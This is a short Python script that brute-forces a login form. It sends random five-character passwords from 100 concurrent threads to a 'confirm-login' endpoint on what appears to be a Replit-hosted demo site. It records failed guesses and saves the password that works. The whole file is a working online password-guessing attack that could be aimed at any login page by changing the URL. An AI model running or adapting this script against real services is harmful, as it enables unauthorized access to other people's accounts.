import requests
import random
import string
from threading import Thread
import os


url = " https://requestswebsite.notanothercoder.repl.co/confirm-login"
username = "username"
alphabet = string.printable[:36]


def send_request(username, password):
    data = {
        "username": username,
        "password": password
    }
    r = requests.get(url, data=data)
    return r


def main():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            randomPass = random.choices(alphabet, k=5)
            password = "".join(randomPass)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if password in tries:
                pass
            else:
                valid = True
        r = send_request(username, password)

        if 'failed to login' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{password}\n")
                f.close()
            print(f"Incorrect {password}\n")
        else:
            print(f"Correct Password {password}\n")
            with open("correct_pass.txt", "w") as f:
                f.write(password)
            break


for x in range(100):
    Thread(target=main).start()
